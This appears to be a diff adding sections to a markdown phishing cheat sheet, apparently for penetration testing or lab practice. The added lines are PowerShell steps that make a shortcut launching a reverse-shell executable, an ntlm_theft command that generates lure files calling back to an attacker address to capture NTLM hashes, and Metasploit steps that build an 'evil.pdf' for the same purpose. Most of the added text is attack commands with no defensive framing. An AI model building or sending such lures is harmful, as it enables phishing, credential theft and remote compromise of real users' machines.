@@ -1,10 +1,32 @@
 ---
 title: "Phishing"
 date: 2024-6-26
-tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt", "libre", "vba"]
+tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt", "libre", "vba", "ntlm_theft"]
 ---
 
 ---
+### Create malicious .lnk
+
+```powershell
+$obj = New-Object -ComObject WScript.Shell
+```
+
+```powershell
+$link = $obj.CreateShortcut("C:\Windows\Tasks\Calculator.lnk")
+```
+
+```powershell
+$link.TargetPath = "C:\windows\tasks\rev.exe"
+```
+
+```powershell
+$link.Save()
+```
+
+<br>
+
+---
+
 ### Phishing with XLL (Excel)
 
 [revshells.com](https://www.revshells.com/)
@@ -166,6 +188,45 @@ End Sub
 |5. "Events" > "Open Document" > "OK"                     |
 |6. "SAVE"                                                |
 +---------------------------------------------------------+
+```
+
+<br>
+
+---
+
+### Phishing with multiple file types
+
+[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
+
+
+```bash
+python3 ntlm_theft.py -g all -s 10.10.14.10 -f test
+```
+
+<br>
+
+---
+
+### Create malicious pdf file
+
+```bash
+msfconsole -q
+```
+
+```bash
+search badpdf
+```
+
+```bash
+set filename evil.pdf
+```
+
+```bash
+set lhost 10.10.14.10
+```
+
+```bash
+exploit
 ```
 
 <br>
